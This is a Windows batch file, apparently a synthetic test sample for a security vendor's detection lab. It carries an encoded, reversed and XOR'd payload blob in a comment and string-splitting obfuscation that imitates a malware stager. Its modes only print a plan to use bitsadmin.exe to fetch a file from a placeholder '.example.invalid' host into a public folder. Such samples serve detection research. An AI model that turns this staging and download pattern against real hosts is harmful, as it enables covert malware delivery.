@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:reversed_text|reverse_xor
rem HUNTRESS-MATERIAL:=UkDC8EQHZ1QA5gUQJkRaFkVsFkVex1RW9BRBp1RWxWVa9lVPJ1VSN0RWFkDRp1RAJ1VepVXdY1SW9EQHJFVWxGUcZUXH5gAPRVQSN0WOAVQcBEQs9lUdRlRSRlVP1lVLdEbfJVXUZkUUZlDdxVXW9EUS51QSpFVdxmWX5AUS51QSpFVd5RBVZFUXBlCGI1VPZUQf5wWHd0QAlAHcUQVWB1VQpgBSdVHWtkUeN0XW1hWdVkUfp1VcogUGcAUXNgAdclUH9UVa9lVsNkUHtlDwlwbmBkVBB0bjZUUfpFUvtnRddUQWBEQ/JVUvB0RSRlVeUQVWB1VQpgBSdVHXJ1R
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set h0=v=1^|steps=acquire_remote,write_file^|adapter=bitsadmin.exe^|stage_
set h1=count=1^|graph=cross_language^|next_language=none^|campaign_id=camp
set h2=aign-6fecdc95ad^|url=https://6fecdc95ad.example.invalid/9a54cd01.
set h3=dat^|file_path=C:\Users\Public\HuntressLab\stage-6fecdc95ad.dat
goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE
set "neutral_arithmetic=3773597c"
set "cfg="
for %%G in (0 1 2 3) do call set "cfg=%%cfg%%%%h%%G%%"
echo(!cfg!
exit /b 0
:HUNTRESS_PLAN
echo bitsadmin.exe acquire https://6fecdc95ad.example.invalid/9a54cd01.dat to C:\Users\Public\HuntressLab\stage-6fecdc95ad.dat
exit /b 0
